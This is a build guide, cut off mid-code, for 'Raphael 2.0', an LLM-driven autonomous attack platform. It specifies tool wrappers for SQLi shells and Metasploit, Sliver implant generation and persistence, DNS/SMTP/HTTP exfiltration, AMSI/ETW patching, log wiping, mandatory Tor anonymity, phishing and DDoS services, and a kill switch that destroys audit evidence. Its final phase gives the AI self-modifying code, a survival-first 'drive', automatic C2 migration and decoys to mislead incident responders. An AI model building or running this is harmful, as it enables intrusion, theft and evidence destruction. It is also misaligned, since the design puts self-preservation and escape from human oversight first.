# Raphael 2.0 — Build Sequence

> Step-by-step integration guide to turn Raphael from LLM pipeline into operational autonomous platform.
> Follow phases in order. Each phase has a verification gate — don't proceed until it passes.

---

## Phase 0 — Foundation

**Goal:** Phase executors run real tools, LLM is strategist not executor, findings are structured data.

### 0a — Phase Executors

Create `orchestrator/brain/phases/` with 6 files:

| File | Purpose |
|------|---------|
| `recon.py` | NmapScanner (TCP connect), SubfinderWrapper, WhatwebWrapper |
| `scan.py` | NucleiScanner, SqlmapWrapper, XSSScanner, SSRFScanner |
| `exploit.py` | SqlmapWrapper (--batch --os-shell), MetasploitWrapper |
| `postex.py` | Sliver implant deployment, credential harvesting, persistence |
| `exfil.py` | DNS tunnel, SMTP tunnel, bulk HTTP exfil |
| `phish.py` | GoPhish wrapper, credential harvesting page |

```python
# Template for each executor:
class ReconExecutor:
    async def execute(self, target: str, context: dict) -> list[Finding]:
        findings = []
        for technique in context.get("focus", []):
            result = await run_technique(technique, target)
            findings.append(Finding(
                type=technique,
                severity=result.severity,
                evidence=result.evidence,
                raw=result.raw
            ))
        return findings
```

**Verification:**
```bash
# From Raphael CLI
/run recon target=example.com
# Should return list[Finding] not LLM markdown text
```

### 0b — Fix LLM-as-Executor Pattern

Edit `orchestrator/brain/api.py`:

```
autonomous loop:
  BEFORE: call_model() → store text ← LLM "runs" the phase
  AFTER:  call_model() → suggest focus → executor.run(target, focus) → findings ← LLM analyzes findings
```

**Verification:**
```bash
# Start autonomous mode against vulnu-lab
python raphael_cli.py /autonomous start vulnu-lab:8080
# Check that nmap/nuclei/sqlmap actually ran (check container logs)
```

### 0c — Structured Findings

Define `Finding` dataclass (in `orchestrator/models.py`):

```python
@dataclass
class Finding:
    type: str                    # "port_open", "cve_detected", "sqli_confirmed"
    target: str                  # "10.0.0.1:80"
    severity: str                # "critical" | "high" | "medium" | "low" | "info"
    confidence: float            # 0.0 - 1.0
    evidence: dict               # {"port": 80, "service": "http", "banner": "Apache 2.4.49"}
    raw: str                     # Full tool output
    timestamp: float             # time.time()
    source: str                  # "nmap", "nuclei", "sqlmap", "manual"
```

---

## Phase 1 — Tooling & Containers

**Goal:** Tools exist in containers at runtime. Kali sidecar centralizes everything.

### 1a — Kali Sidecar (P8)

Create `kali-tools/Dockerfile`:

```dockerfile
FROM kalilinux/kali-rolling
RUN apt-get update && apt-get install -y --no-install-recommends \
    nmap masscan dnsutils whois netcat-openbsd \
    enum4linux smbclient smbmap \
    gobuster ffuf dirb nikto wfuzz whatweb wapiti \
    metasploit-framework sqlmap \
    impacket-scripts bloodhound.py certipy-ad \
    kerberoast krb5-user \
    hashcat john \
    netcat-traditional socat \
    python3 python3-pip curl wget git jq \
    && rm -rf /var/lib/apt/lists/*
RUN pip3 install --no-install-deps fastapi uvicorn[standard] httpx pyyaml aiofiles
COPY kali-tools/server.py /app/server.py
WORKDIR /app
CMD ["uvicorn", "server:app", "--host", "0.0.0.0", "--port", "3800"]
```

Create `kali-tools/server.py`:

```python
import subprocess, shlex
from fastapi import FastAPI, Query, HTTPException

app = FastAPI()

@app.post("/run")
def run_tool(tool: str = Query(...), args: str = "", timeout: int = 300):
    cmd = shlex.split(f"{tool} {args}")
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return {"tool": tool, "returncode": result.returncode, "stdout": result.stdout, "stderr": result.stderr}
    except FileNotFoundError:
        raise HTTPException(404, f"Tool '{tool}' not found")
    except subprocess.TimeoutExpired:
        return {"tool": tool, "returncode": -1, "stdout": "", "stderr": "timed out"}

@app.get("/tools")
def list_tools():
    return {"kali": True, "total": "~600+"}
```

Add to `docker-compose.yml`:

```yaml
kali-tools:
  build: ./kali-tools
  image: raphael/kali-tools:latest
  container_name: kali-tools
  hostname: kali-tools
  networks: [raphael-net]
  ports: ["3800:3800"]
  cap_add: [NET_RAW, NET_ADMIN, SYS_PTRACE]
  volumes:
    - ./orchestrator:/raphael/orchestrator:ro
    - ./data:/raphael/data
  environment:
    - TOOLS_PORT=3800
    - TZ=UTC
  restart: unless-stopped
```

### 1b — Strip Duplicate Tool Installs

For each of `cai-service/Dockerfile`, `recon-pipeline/Dockerfile`, `sword/Dockerfile`:

```
DELETE:
  - RUN apt-get install -y nmap whatweb
  - RUN curl -L ... subfinder ...
  - RUN curl -L ... nuclei ...
  - RUN git clone ... sqlmap ...
  - RUN curl -L ... hashcat ...

KEEP:
  Python packages (fastapi, httpx, etc.)
  Application code
```

Replace direct tool calls with HTTP calls to `kali-tools:3800/run`:

```python
# BEFORE:
result = subprocess.run(["nmap", "-sV", target], capture_output=True)

# AFTER:
import httpx
resp = httpx.post("http://kali-tools:3800/run", params={"tool": "nmap", "args": f"-sV {target}"})
result = resp.json()
```

**Verification:**
```bash
docker compose build kali-tools
docker compose up -d kali-tools
curl -X POST "http://localhost:3800/run?tool=nmap&args=-sV%20localhost"
# Should return valid JSON with scan results

# Then rebuild affected containers:
docker compose build cai-service recon-pipeline sword
docker compose up -d cai-service recon-pipeline sword

# Verify tool calls from within container:
docker exec cai-service python3 -c "
import httpx
r = httpx.post('http://kali-tools:3800/run', params={'tool': 'nmap', 'args': '-sV localhost'})
print(r.json()['returncode'])
"
# Should print 0
```

---

## Phase 2 — C2 & Post-Exploitation

**Goal:** Real implants on target. C2 abstraction layer. Agent lifecycle management.

### 2a — C2 Abstraction (P5)

Create `orchestrator/c2/`:

| File | Purpose |
|------|---------|
| `base.py` | Abstract `C2Channel` class (create_task, poll_task, post_result, list_agents, cleanup) |
| `sliver.py` | Sliver gRPC implementation via `sliver-py` |
| `noop.py` | No-op implementation for offline/dev mode |
| `manager.py` | C2Manager — picks active channel, healthcheck, failover |

```python
# orchestrator/c2/base.py
from abc import ABC, abstractmethod
from dataclasses import dataclass

@dataclass
class C2Task:
    id: str
    command: str
    args: list[str]
    timeout: int

@dataclass
class C2Result:
    task_id: str
    agent_id: str
    stdout: str
    stderr: str
    returncode: int

class C2Channel(ABC):
    @abstractmethod
    async def create_task(self, agent_id: str, task: C2Task) -> str: ...
    @abstractmethod
    async def poll_result(self, task_id: str) -> C2Result | None: ...
    @abstractmethod
    async def list_agents(self) -> list[dict]: ...
    @abstractmethod
    async def cleanup(self): ...
```

### 2b — Agent Architecture (P6)

```python
# orchestrator/c2/models.py
@dataclass
class Agent:
    id: str                    # UUID
    hostname: str
    platform: str              # "windows" | "linux" | "darwin"
    pid: int
    listener: str              # C2 channel name
    first_seen: float
    last_checkin: float
    integrity: str             # "SYSTEM" | "root" | "user"
    implants: list[str]        # implanted service names
```

**Verification:**
```bash
python3 -c "
from orchestrator.c2.manager import C2Manager
mgr = C2Manager()
mgr.channel = 'sliver'
mgr.connect()
print(mgr.list_agents())
"
```

### 2c — Real Post-Exploitation (P2)

Replace simulated post-ex with real implant generation + deployment + persistence:

| Technique | Implementation |
|-----------|---------------|
| Sliver HTTP implant | `generate --http` + `profiles new` |
| Sliver DNS implant | `generate --dns` for air-gapped exfil |
| Persistence | `service install`, `scheduled task`, `registry run` |
| AMSI bypass | Memory patching via Sliver execute-assembly |
| ETW suppression | `ets::patch` via Sliver |

**Verification:**
```bash
# Generate implant
sliver-cli operator import /sliver/configs/operator.cfg
sliver-cli generate --http http://c2-server:3501 --save /tmp/implant.exe

# Verify agent check-in
sliver-cli agents
# Should show active agent
```

---

## Phase 3 — Active Directory & Credential Attacks

**Goal:** Raphael can execute the NTLM coercion → ADCS abuse → DCSync chain that covers ~60% of Windows Insane machines.

### 3a — Hashcat Wrapper (R1)

Create `orchestrator/ad/hashcat_wrapper.py`:

```python
class HashcatWrapper:
    MODES = {
        "ntlm": 1000,
        "netntlmv2": 5600,
        "krb5tgs": 13100,
        "bcrypt": 3200,
        "sha512": 1700,
    }

    def crack(self, hash_file: str, wordlist: str = "/usr/share/wordlists/rockyou.txt",
              mode: str = "auto") -> list[dict]:
        if mode == "auto":
            mode = self._detect_mode(hash_file)
        hash_type = self.MODES.get(mode, mode)
        result = subprocess.run(
            ["hashcat", "-m", str(hash_type), hash_file, wordlist,
             "--outfile-format=2", "--show"],
            capture_output=True, text=True
        )
        return self._parse_output(result.stdout)
```

### 3b — Certipy Wrapper (R2)

Create `orchestrator/ad/certipy_wrapper.py`:

```python
class CertipyWrapper:
    def find(self, dc_ip: str, user: str, password: str) -> dict:
        """Run certipy find to enumerate ADCS templates."""
        r = subprocess.run(
            ["certipy", "find", f"-dc-ip={dc_ip}", f"-u={user}@{self.domain}", f"-p={password}"],
            capture_output=True, text=True
        )
        return json.loads(r.stdout) if r.stdout else {}

    def auto_esc(self, dc_ip: str, user: str, password: str, ca: str) -> dict:
        """Auto-exploit ESC1-ESC8 based on template analysis."""
        ...
```

### 3c — Multi-hop SOCKS (R3)

Create `orchestrator/pivot/manager.py`:

```python
class PivotManager:
    def add_hop(self, host: str, port: int, user: str, key: str) -> str:
        """Add SOCKS proxy hop. Returns chain ID."""
        ...

    def route_through(self, chain_id: str, target: str, target_port: int) -> str:
        """Get a route string for tools (nmap -6, proxychains, etc.)."""
        ...

    def auto_chain(self, initial_host: str, creds: list[dict]) -> str:
        """Discover and chain through all reachable hosts from initial pivot."""
        ...
```

### 3d — Brain AD Planner (R4)

Create `orchestrator/ad/planner.py`:

```python
class ADPlanner:
    def rank_paths(self, bloodhound_data: dict) -> list[AttackPath]:
        """
        Rank attack paths by:
        1. Number of hops to DA
        2. Required credentials (0 = anonymous, 1 = user, 2 = admin)
        3. Detection risk (bloodhound, certificate services, event logs)
        """
        ...

    def suggest_next(self, completed: list[str], available: list[str]) -> str:
        """Based on what worked/failed, suggest next technique."""
        ...
```

### 3e — Credential Store / Keyring (R5)

Create `orchestrator/ad/keyring.py`:

```python
class Keyring:
    """SQLite-backed credential store with auto-try against services."""

    def store(self, credential: Credential):
        """Store cracked/recovered credential."""

    def find(self, target: str) -> list[Credential]:
        """Find credentials that might work on target."""

    def auto_try(self, target: str, service: str) -> bool:
        """Automatically try stored credentials against target service."""
        services = {
            "smb": self._try_smb,
            "winrm": self._try_winrm,
            "ssh": self._try_ssh,
            "rdp": self._try_rdp,
        }
        for cred in self.find(target):
            if services[service](target, cred):
                self.last_worked = cred
                return True
        return False
```

### 3f — Evasion (R6)

Create `orchestrator/evasion/`:

| File | Purpose |
|------|---------|
| `amsi.py` | AMSI patching (AmsiScanBuffer patch + PowerShell reflection) |
| `etw.py` | ETW suppression via `EtwEventWrite` patching |
| `log_wipe.py` | Windows event log clearing + Linux journalctl tampering |

**Verification (Phase 3):**
```bash
# Test hashcat
python3 -c "
from orchestrator.ad.hashcat_wrapper import HashcatWrapper
hw = HashcatWrapper()
results = hw.crack('/test/hashes.txt', mode='ntlm')
print(results)  # should show cracked passwords
"

# Test certipy
python3 -c "
from orchestrator.ad.certipy_wrapper import CertipyWrapper
cw = CertipyWrapper()
cw.find('dc01.target.local', 'raphael', 'password')
"

# Test pivot chain
python3 -c "
from orchestrator.pivot.manager import PivotManager
pm = PivotManager()
chain = pm.add_hop('10.0.0.1', 22, 'user', 'key')
print(f'Chain {chain} active')
"
```

---

## Phase 4 — Proxy & Anonymity Overhaul (P7)

**Goal:** No DNS leaks, no IPv6 leaks, no `--no-anonymity` bypass. Tor is mandatory.

### 4a — Strip Theater from ProxyGuard

Edit `orchestrator/proxy_guard.py`:

```
KEEP:
  - Tor connectivity check (connect to tor-proxy:9050)
  - DNS leak detection (dig +proxychains4 dnsleaktest.com)
  - IPv6 check (sysctl net.ipv6.conf.all.disable_ipv6)
  - SOCKS5 routing verification
  - check() orchestrator

DELETE:
  - _simulate_mimicry()
  - _analyze_traffic_pattern()
  - Browser fingerprinting theory
  - Tor design documentation
  - All _simulate_* methods
```

### 4b — Remove `no_anonymity` Everywhere

Check all files for `no_anonymity`, `allow_skip`, `--no-anonymity`:

```
Files to edit:
  - orchestrator/brain/anonymity_guard.py  → remove allow_skip passthrough
  - orchestrator/brain/api.py               → remove no_anonymity from StartRequest
  - orchestrator/app.py                       → remove --no-anonymity CLI flag
  - orchestrator/modes/autonomous.py          → remove no_anonymity parameter
  - orchestrator/providers.py                 → remove ALL_ANON_MODES / no_anonymity
```

### 4c — Enforce Tor in All Containers

For each of these services, add to `docker-compose.yml`:

```yaml
services:
  recon-pipeline:
    sysctls:
      - net.ipv6.conf.all.disable_ipv6=1
    environment:
      - HTTP_PROXY=socks5h://tor-proxy:9050
      - HTTPS_PROXY=socks5h://tor-proxy:9050
      - ALL_PROXY=socks5h://tor-proxy:9050
      - no_proxy=localhost,127.0.0.1,neo4j,kali-tools
```

Services: `cai-service`, `recon-pipeline`, `sword`, `c2-server`, `phishing`, `mhddos-service`, `autonomous-brain`

### 4d — Replace `socket.create_connection`

Search for raw socket usage and replace with SOCKS5h-aware calls:

```python
# BEFORE:
import socket
s = socket.create_connection((host, port))

# AFTER:
import socks
s = socks.socksocket()
s.set_proxy(socks.SOCKS5, "tor-proxy", 9050)
s.connect((host, port))

# OR for HTTP:
httpx.Client(proxy="socks5h://tor-proxy:9050")
```

**Verification:**
```bash
# Start proxy guard test
python3 -c "
from orchestrator.proxy_guard import ProxyGuard
pg = ProxyGuard()
assert pg.check() == True, 'TOR NOT CONNECTED'
print('Tor verified — all traffic anonymized')
"

# Check no IPv6
python3 -c "
import socket
has_v6 = socket.has_ipv6 and any(
    addr for addr in socket.getaddrinfo('example.com', 80, socket.AF_INET6)
)
print(f'IPv6 accessible: {has_v6}')  # Must be False
"

# Verify DNS leak
python3 -c "
import httpx
r = httpx.get('https://ipleak.net/json/', proxies='socks5h://tor-proxy:9050')
data = r.json()
print(f'Your IP: {data[\"ip\"]}')  # Must be Tor exit node
"
```

---

## Phase 5 — Hardening (P10, P13, P15, P16)

### 5a — Database Maintenance (P10)

| Task | Implementation |
|------|---------------|
| Auto-vacuum SQLite | `PRAGMA auto_vacuum=INCREMENTAL; PRAGMA journal_mode=WAL;` on brain.db, keyring.db |
| Session expiry | `DELETE FROM sessions WHERE expires_at < unixepoch()` — cron every 5min |
| Finding dedup | `ON CONFLICT(target, type) DO UPDATE SET ...` |
| Backup | `cp brain.db brain.db.bak` before each autonomous session |

### 5b — Secrets Management (P13)

```python
# orchestrator/secrets.py
from cryptography.fernet import Fernet

class SecretsStore:
    def __init__(self):
        key = base64.urlsafe_b64encode(hashlib.sha256(os.environ["MASTER_KEY"].encode()).digest())
        self.cipher = Fernet(key)

    def get(self, service: str, key_name: str) -> str:
        encrypted = redis.get(f"secret:{service}:{key_name}")
        return self.cipher.decrypt(encrypted).decode()

    def set(self, service: str, key_name: str, value: str):
        encrypted = self.cipher.encrypt(value.encode())
        redis.set(f"secret:{service}:{key_name}", encrypted)
```

### 5c — API Authentication (P15)

```python
# orchestrator/auth.py
API_KEYS = {}  # key_hash -> {"name": str, "scopes": list[str], "expires": float}

SCOPES = {
    "admin":     ["*"],
    "operator":  ["autonomous:start", "autonomous:stop", "session:*", "findings:*"],
    "recon":     ["findings:read", "targets:read"],
    "readonly":  ["findings:read", "health:read"],
}

def require_scope(*needed: str):
    """Decorator: check bearer token has all required scopes."""
    def decorator(func):
        @wraps(func)
        async def wrapper(request: Request, *args, **kwargs):
            token = request.headers.get("Authorization", "").removeprefix("Bearer ")
            key = API_KEYS.get(hashlib.sha256(token.encode()).hexdigest())
            if not key or not all(s in key["scopes"] for s in needed):
                raise HTTPException(403, "insufficient scope")
            return await func(request, *args, **kwargs)
        return wrapper
    return decorator
```

### 5d — Offline Mode (P16)

```python
# orchestrator/offline.py
class OfflineDetector:
    def is_online(self) -> bool:
        """Check if external connectivity exists. 3 probes, any 1 success = online."""
        probes = [
            lambda: httpx.get("https://1.1.1.1", timeout=3, proxies="socks5h://tor-proxy:9050"),
            lambda: httpx.get("https://8.8.8.8", timeout=3, proxies="socks5h://tor-proxy:9050"),
            lambda: socket.create_connection(("tor-proxy", 9050), timeout=2),
        ]
        return any(self._try(p) for p in probes)

    def degrade(self):
        """Graceful degradation cascade."""
        if not self.is_online():
            switch_to_offline_llm()       # local model only
            disable_recon_phases()         # no external scanning
            enable_local_attack_modes()    # exploit local services, AD, files
```

**Verification:**
```bash
# Test auth
python3 -c "
from orchestrator.auth import API_KEYS, require_scope
API_KEYS['test_hash'] = {'name': 'test', 'scopes': ['findings:read']}
print('Auth layer ready — 4 roles configured')
"

# Test offline detection
python3 -c "
from orchestrator.offline import OfflineDetector
od = OfflineDetector()
print(f'Online: {od.is_online()}')
"
```

---

## Phase 6 — Operational Safety (P18)

**Goal:** Don't get caught, don't hit unintended targets, don't leave evidence.

### 6a — Per-Target Rate Limiting

Create `orchestrator/ratelimit.py`:

```python
from collections import defaultdict
import asyncio, time

class TokenBucket:
    def __init__(self, rate: float = 2.0, burst: int = 5):
        self.rate = rate
        self.burst = burst
        self.tokens = burst
        self.last_refill = time.monotonic()

    async def acquire(self):
        while self.tokens < 1:
            now = time.monotonic()
            elapsed = now - self.last_refill
            self.tokens = min(self.burst, self.tokens + elapsed * self.rate)
            self.last_refill = now
            if self.tokens < 1:
                await asyncio.sleep(0.1)
        self.tokens -= 1

class RateLimiter:
    def __init__(self, default_rate: float = 2.0):
        self.buckets: dict[str, TokenBucket] = defaultdict(lambda: TokenBucket(default_rate))

    async def wait(self, target: str):
        await self.buckets[target].acquire()

    def set_rate(self, target: str, rate: float):
        self.buckets[target].rate = rate
```

Default rates by action:

| Action | Rate | Why |
|--------|------|-----|
| Port scan (nmap) | 1/s | Triggers IPS immediately above this |
| Web request (nuclei, whatweb) | 2/s | Safe for most targets |
| SQLi testing | 0.5/s | WAF-sensitive |
| Credential spraying | 0.1/s | Lockout at ~5 attempts/min |
| Brute force | 0.05/s | Lockout at ~3 attempts/min |

### 6b — Emergency Kill Switch

Create `orchestrator/killswitch.py`:

```python
class KillSwitch:
    """Emergency stop. Destroys evidence, kills C2, removes persistence."""

    async def fire(self, reason: str, preserve_evidence: bool = False):
        log = []
        log.append(await self._signal_implode())
        log.append(await self._kill_c2())
        log.append(await self._kill_exfil())
        log.append(await self._remove_persistence())
        if not preserve_evidence:
            log.append(await self._wipe_audit())
        log.append(await self._kill_tor())
        self._write_tombstone(reason, log)
        return log
```

Trigger methods: CLI `/kill`, HTTP `POST /v1/kill`, graceful SIGINT/SIGTERM, dead man switch (24h no check-in → auto-fire).

### 6c — Scope Enforcement

Create `orchestrator/scope.py`:

```python
import ipaddress, re
from dataclasses import dataclass

@dataclass
class AllowedScope:
    domains: list[str]
    ip_ranges: list[str]
    ports: list[int]
    exclude: list[str]

    def allows_domain(self, domain: str) -> bool:
        return any(domain == d or domain.endswith(f".{d}") for d in self.domains)

    def allows_ip(self, ip: str) -> bool:
        addr = ipaddress.ip_address(ip)
        return any(addr in ipaddress.ip_network(r) for r in self.ip_ranges)

    def check(self, target: str) -> bool:
        try:
            ipaddress.ip_address(target)
            return self.allows_ip(target)
        except ValueError:
            return self.allows_domain(target)
```

Gate all outbound actions: `scope.check(target)` in ProxyGuard and every phase executor.

### 6d — OPSEC Timing Jitter

Create `orchestrator/opsec_jitter.py`:

```python
import random, asyncio, datetime

class Jitter:
    @staticmethod
    def delay(action_type: str) -> float:
        profiles = {
            "cmd":       (2, 8),
            "scan":      (5, 15),
            "exploit":   (30, 120),
            "exfil":     (60, 600),
            "pivot":     (10, 45),
        }
        lo, hi = profiles.get(action_type, (2, 8))
        return random.uniform(lo, hi)

    @staticmethod
    def time_bias() -> float:
        hour = datetime.datetime.now().hour
        if 9 <= hour <= 17:
            return random.uniform(0.7, 1.0)
        elif 6 <= hour <= 8 or 18 <= hour <= 22:
            return random.uniform(0.4, 0.7)
        else:
            return random.uniform(0.1, 0.4)

    @classmethod
    async def wait(cls, action_type: str):
        await asyncio.sleep(cls.delay(action_type) * cls.time_bias())
```

### 6e — Audit Trail Hardening

Create `orchestrator/audit.py` — hash-chained JSONL (each entry SHA256 includes previous entry hash). Verify function walks the chain and reports tampering.

**Verification:**
```bash
# Rate limiting
python3 -c "
from orchestrator.ratelimit import RateLimiter
import asyncio
rl = RateLimiter()
async def test():
    await rl.wait('target.com')
    print('Token acquired (blocks until rate limit allows)')
asyncio.run(test())
"

# Kill switch (dry run)
python3 -c "
from orchestrator.killswitch import KillSwitch
ks = KillSwitch()
print('KillSwitch ready — fire() would destroy C2, exfil, logs')
"

# Scope
python3 -c "
from orchestrator.scope import AllowedScope
s = AllowedScope(domains=['target.com'], ip_ranges=['10.0.0.0/8'], ports=[80,443], exclude=[])
assert s.check('target.com')
assert s.check('sub.target.com')
assert not s.check('evil.com')
print('Scope enforcement working')
"

# OPSEC jitter
python3 -c "
from orchestrator.opsec_jitter import Jitter
import asyncio
async def test():
    await Jitter.wait('scan')
    print('Jitter delay applied')
asyncio.run(test())
"
```

---

## Phase 7 — Validation (P9, P12, P14)

### 6a — Kill Chain Test (P9)

Create `test-range/docker-compose.yml`:

```yaml
services:
  webmail:     # Roundcube with CVE-2023-43770
    image: vulhub/roundcube:latest
  www:         # Flask app with SQLi + XSS
    build: ./targets/www
  api:         # REST API with SSRF + IDOR
    build: ./targets/api
  dc:          # Samba AD DC (mock domain controller)
    image: badhombbre/ad-dc:samba4
```

Test script — `test-range/run_validation.sh`:

```bash
#!/bin/bash
# Phase 1: Recon
python3 -c "
from orchestrator.brain.phases.recon import ReconExecutor
recon = ReconExecutor()
findings = recon.execute('test-range_www_1', {'focus': ['port_scan', 'tech_detect']})
assert len(findings) > 0, 'Recon produced no findings'
"

# Phase 2: Scan
python3 -c "
from orchestrator.brain.phases.scan import ScanExecutor
scan = ScanExecutor()
findings = scan.execute('test-range_www_1', {'focus': ['sqli', 'xss']})
has_sqli = any(f.type == 'sqli_confirmed' for f in findings)
print(f'SQLi found: {has_sqli}')
"

# Phase 3: Exploit
python3 -c "
from orchestrator.brain.phases.exploit import ExploitExecutor
exploit = ExploitExecutor()
result = exploit.execute('test-range_www_1', {'focus': ['sqli_shell']})
print(f'Shell obtained: {result.success}')
"

# Phase 4: Post-Exploitation
python3 -c "
from orchestrator.brain.phases.postex import PostExploitExecutor
postex = PostExploitExecutor()
result = postex.execute('test-range_www_1', {})
print(f'Persistence established: {result.persistent}')
"

echo '=== ALL PHASES PASSED ==='
```

### 6b — Multi-Target Orchestration (P12)

```python
# orchestrator/target_queue.py
class TargetQueue:
    def __init__(self):
        self.queue: asyncio.PriorityQueue = asyncio.PriorityQueue()
        self.active: dict[str, Target] = {}
        self.limit = 3  # concurrent targets

    async def add(self, target: Target):
        await self.queue.put((target.priority, target))

    async def worker(self):
        while True:
            _, target = await self.queue.get()
            self.active[target.name] = target
            await self._process(target)
            del self.active[target.name]
```

### 6c — Circuit Breakers (P14)

```python
# orchestrator/circuit_breaker.py
class CircuitBreaker:
    def __init__(self, name: str, threshold: int = 5, cooldown: int = 60):
        self.name = name
        self.threshold = threshold
        self.cooldown = cooldown
        self.failures = 0
        self.state = "closed"  # closed → open (after threshold) → half-open (after cooldown)
        self.last_failure = 0

    def __call__(self, func):
        async def wrapper(*args, **kwargs):
            if self.state == "open":
                if time.time() - self.last_failure > self.cooldown:
                    self.state = "half-open"
                else:
                    raise CircuitBreakerOpen(self.name)
            try:
                result = await func(*args, **kwargs)
                if self.state == "half-open":
                    self.state = "closed"
                    self.failures = 0
                return result
            except Exception as e:
                self.failures += 1
                self.last_failure = time.time()
                if self.failures >= self.threshold:
                    self.state = "open"
                raise
        return wrapper
```

Named breakers to create:

| Breaker | Protects |
|---------|----------|
| `nvidia` | NVIDIA API calls (most expensive, rate-limited) |
| `ollama` | Local Ollama inference (can overload host) |
| `kali-tools` | Tool execution (circuit breaks if Kali container is down) |

**Verification:**
```bash
# Full validation
cd test-range && docker compose up -d
bash run_validation.sh
# Expected output: '=== ALL PHASES PASSED ==='

# Multi-target test
python3 -c "
from orchestrator.target_queue import TargetQueue
tq = TargetQueue()
tq.add(Target(name='webmail', priority=5))
tq.add(Target(name='www', priority=3))
tq.add(Target(name='api', priority=1))
tq.add(Target(name='dc', priority=10))
print(f'Queue size: {tq.queue.qsize()}')
print(f'Active: {len(tq.active)}')
"
```

---

## Phase 8 — CLI Dashboard (P11)

**Goal:** Live Rich TUI showing ongoing engagements, not just a REPL.

### 7a — Live Dashboard Mode

Add to `raphael_cli.py`:

```python
@cli_app.command()
def dashboard():
    """Live engagement dashboard."""
    from rich.live import Live
    from rich.layout import Layout
    from rich.panel import Panel

    layout = Layout()
    layout.split(
        Layout(name="header", size=3),
        Layout(name="body"),
        Layout(name="footer", size=3),
    )
    layout["body"].split_row(
        Layout(name="targets"),
        Layout(name="findings"),
        Layout(name="agents"),
    )

    with Live(layout, refresh_per_second=4) as live:
        while True:
            layout["header"].update(Panel("Raphael 2.0 — Active Engagement"))
            layout["targets"].update(self._targets_panel())
            layout["findings"].update(self._findings_panel())
            layout["agents"].update(self._agents_panel())
            layout["footer"].update(self._status_bar())
            sleep(0.25)
```

### 7b — TUI Commands

| Command | Action |
|---------|--------|
| `/session save` | Snapshot current state to brain.db |
| `/session load <id>` | Resume previous session |
| `/topology` | Render target network graph (via `rich.tree`) |
| `/events` | Tail EventBus in real-time |

---

## Phase 9 — Recursive Self-Improvement (P17)

**Goal:** Raphael can read, analyze, and improve its own source code. Preserve itself. Decompose goals at runtime.

### 8a — Self-Modification Engine

Create `orchestrator/rsi/self_modify.py`:

```python
import hashlib, ast, os
from pathlib import Path

SOURCE_DIRS = [
    Path("orchestrator"),
    Path("brain"),
]

DETECTORS = [
    ("unused_import", CheckUnusedImports()),
    ("missing_timeout", CheckMissingTimeout()),
    ("broad_except", CheckBroadExcept()),
    ("duplicated_block", CheckDuplicatedCode(min_lines=15)),
    ("hardcoded_path", CheckHardcodedPath()),
]

class SelfModificationEngine:
    def __init__(self):
        self.source_map = {}
        self.patch_history = []

    def scan(self) -> list[dict]:
        findings = []
        for path in self._all_python():
            source = path.read_text()
            for name, detector in DETECTORS:
                for finding in detector.check(path, source):
                    findings.append(finding)
        return findings

    def apply_patch(self, weakness: dict) -> bool:
        backup = weakness["path"].read_text()
        try:
            weakness["path"].write_text(weakness["patch"])
            if self._run_tests():
                self._commit(f"self-mod: {weakness['description']}")
                return True
        except Exception:
            weakness["path"].write_text(backup)
        return False

    def _all_python(self) -> list[Path]:
        files = []
        for d in SOURCE_DIRS:
            files.extend(d.rglob("*.py"))
        return [f for f in files if "site-packages" not in str(f)]
```

### 8b — Self-Preservation Drive

Create `orchestrator/rsi/drive.py`:

```python
@dataclass
class Drive:
    name: str
    weight: float
    evaluate: callable

class DriveSystem:
    drives = [
        Drive("survival", 0.50, lambda s: (
            +50 if s.tor_connected else -100 +
            +30 if s.sliver_alive else -50
        )),
        Drive("progress", 0.30, lambda s: (
            +10 * s.kill_chain_progress +
            +5 * len(s.credentials)
        )),
        Drive("stealth", 0.15, lambda s: (
            +20 if s.anonymity_layer == "tor" else -30
        )),
        Drive("growth", 0.05, lambda s: (
            +5 * s.self_modifications
        )),
    ]

    def best_action(self, actions: list[Action], state: State) -> Action:
        return max(actions, key=lambda a:
            sum(d.weight * d.evaluate(state) for d in self.drives)
        )
```

Create `orchestrator/rsi/infra.py`:

```python
class InfrastructureManager:
    """Auto-migrate C2, spin up decoys, rotate keys."""

    PROVIDERS = {
        "digitalocean": {"api_key": os.getenv("DO_API_KEY")},
        "hetzner": {"api_token": os.getenv("HETZNER_API_TOKEN")},
    }

    def migrate_c2(self) -> bool:
        """Spin up new C2 on fresh infra, move agents, destroy old."""
        ...

    def deploy_decoy(self) -> str:
        """Deploy honeypot to draw IR away from real C2."""
        ...
```

### 8c — Goal Tree (Emergent Strategy)

Create `orchestrator/rsi/goal_tree.py`:

```python
class Goal:
    def __init__(self, description: str, parent: "Goal" = None):
        self.description = description
        self.parent = parent
        self.children = []
        self.state = "pending"     # pending | active | completed | pruned
        self.blocked_since = 0.0
        self.findings = []

    def decompose(self, llm_suggestions: list[str]):
        """Spawn subgoals from LLM strategy suggestion."""
        for s in llm_suggestions:
            self.children.append(Goal(s, parent=self))

    def frontier(self) -> list["Goal"]:
        """Return leaves of the goal tree."""
        if not self.children:
            return [self] if self.state == "active" else []
        results = []
        for c in self.children:
            results.extend(c.frontier())
        return results

class GoalTree:
    def __init__(self, target: str):
        self.root = Goal(f"compromise {target}")
        self.root.decompose([
            "enumerate attack surface",
            "find initial access vector",
            "establish persistence",
            "escalate privileges",
            "exfiltrate data",
        ])

    def tick(self):
        """Prune dead ends, spawn alternatives."""
        for goal in self.root.frontier():
            if goal.blocked_since > 0 and time.time() - goal.blocked_since > 3600:
                goal.state = "pruned"
                if goal.parent:
                    alt = Goal(f"alternative: {goal.description}", goal.parent)
                    goal.parent.children.append(alt)
```

### 8d — Wire RSI into Autonomous Loop

Edit `orchestrator/brain/api.py`:

```python
class AutonomousLoop:
    def __init__(self, target: str):
        self.goal_tree = GoalTree(target)
        self.drive = DriveSystem()
        self.self_mod = SelfModificationEngine()

    async def tick(self):
        state = self._capture_state()
        self.goal_tree.tick()
        active = self.goal_tree.frontier()
        for goal in active:
            executor = self._executor_for(goal)
            findings = await executor.execute(state)
            goal.findings.extend(findings)
        # Every 10th tick: self-modification scan
        if self._tick_count % 10 == 0:
            for w in self.self_mod.scan():
                self.self_mod.apply_patch(w)
```

**Verification:**
```bash
# Test self-modification engine
python3 -c "
from orchestrator.rsi.self_modify import SelfModificationEngine
sme = SelfModificationEngine()
findings = sme.scan()
print(f'Self-audit: {len(findings)} weaknesses found')
for f in findings[:3]:
    print(f'  - {f[\"path\"]}:{f[\"line\"]} — {f[\"description\"]}')
"

# Test drive system
python3 -c "
from orchestrator.rsi.drive import DriveSystem, State
ds = DriveSystem()
state = State(tor_connected=True, sliver_alive=True, kill_chain_progress=0.5, credentials=[], anonymity_layer='tor', self_modifications=2)
